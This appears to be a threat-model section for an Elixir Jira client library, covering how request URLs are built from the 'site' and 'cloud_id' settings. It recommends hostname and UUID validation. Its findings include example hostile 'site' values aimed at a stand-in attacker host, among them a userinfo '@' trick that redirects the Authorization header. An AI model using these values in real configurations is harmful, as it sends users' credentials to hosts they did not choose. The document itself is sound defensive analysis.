# noizu_jira — URL Construction: site / cloud_id

Where request URLs come from and what a hostile value in the client
configuration can do. Grounding: `Client.base_url/1`, `normalize_site/1`,
`Request.encode_segment/1`, `Request.params_query/1`.

## How URLs are assembled

```
base_url <> path <> "?" <> query
```

- **Basic auth:** `base_url = "https://" <> site` — the host is *entirely*
  caller-supplied. `normalize_site/1` only strips `https://` / `http://`
  prefixes and trailing `/`; the scheme is always re-applied as `https://`
  (no downgrade attack), but **no hostname validation happens**.
- **OAuth:** `base_url = "https://api.atlassian.com/ex/jira/" <> cloud_id` —
  the host is fixed; `cloud_id` is interpolated raw into the URL string.
- **Paths:** every dynamic segment (issue keys/ids, attachment ids, board and
  sprint ids, link ids) passes through `encode_segment/1`
  (`URI.encode` over unreserved characters only) — `../`, `/`, `?`, and `#`
  cannot alter path structure (control, covers T-012).
- **Query:** built by the library with `URI.encode_query/1` — values are
  percent-encoded, so commas and `&` inside values cannot split parameters
  (control, §5a of the contract).

## Findings

- **T-003 (Medium, Information disclosure/Spoofing, Open):** because `:site`
  is an arbitrary string re-attached to `https://`, a hostile or mistaken
  value redirects **every request — including the `Authorization` header —
  to an attacker-controlled host**:
  - `site: "evil.example.com"` → all traffic + credentials to that host.
  - `site: "example.atlassian.net@evil.example.com"` → userinfo trick; the
    effective host is `evil.example.com` while the string still *looks* like
    a legitimate site in logs/config.
  This is not SSRF in the classic sense (the caller chooses its own
  destination), but any host application that lets a tenant/user/misread
  config value reach `Client.new(site: ...)` converts that input into
  credential exfiltration. *Recommended mitigation:* validate that `site`
  matches `<something>.atlassian.net` (or an explicit allowlist) and reject
  values containing `@`, `/`, or `?`; document the invariant.
- **T-004 (Low, Tampering, Partially mitigated):** `:cloud_id` is
  unvalidated and string-interpolated. A value containing `?` or `../` can
  mangle the path/query of the request, but the **host is fixed** to
  `api.atlassian.com`, so credentials cannot be redirected off-Atlassian by
  this route. *Recommended mitigation:* UUID-format check on `cloud_id`.
- **Protocol-level mitigations in place:** scheme is always `https`
  (no downgrade); `retry: false` on Req means a request is never silently
  re-sent with different connection parameters; TLS verification is on by
  default. A network MITM cannot downgrade or strip TLS — it can only break
  the connection (surfaced as `{:error, %Error{reason: ...}}`, never
  retried).

## Explicitly out of scope

Proxy configuration, DNS rebinding, and Atlassian-side behavior: with
`req_opts` the host *can* point Req at a proxy or weaken TLS
(`verify: :verify_none`) — the library permits but never sets these; doing
so is a host-side decision and out of this model's boundary.
